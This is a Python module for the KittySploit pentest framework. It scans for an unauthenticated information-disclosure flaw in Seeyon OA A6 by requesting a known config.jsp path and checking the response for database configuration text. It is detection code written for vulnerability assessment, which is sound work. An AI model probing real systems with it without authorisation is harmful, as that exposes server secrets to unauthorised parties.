#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The Seeyon OA A6 config."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Seeyon OA A6 config.jsp - Information Disclosure Detection',
        'description': 'The Seeyon OA A6 config.jsp page can be accessed without authorization, resulting in sensitive information leakage vulnerabilities, through which attackers can obtain sensitive information in the server',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'seeyon', 'oa', 'config', 'info-leak', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20config.jsp%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md',
            'https://github.com/achuna33/MYExploit/blob/8ffbf7ee60cbd77ad90b0831b93846aba224ab29/src/main/java/com/achuna33/Controllers/SeeyonController.java',
        ],
    }

    def run(self):
        path = '/yyoa/ext/trafaxserver/SystemManage/config.jsp'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DatabaseName=', '请在文本框内配置传真插件所需服务器的信息',)
        if all(m in body for m in body_all):
            self.set_info(severity='medium', reason='Seeyon OA A6 config.jsp - Information Disclosure detected', path=path)
            return True
        return False

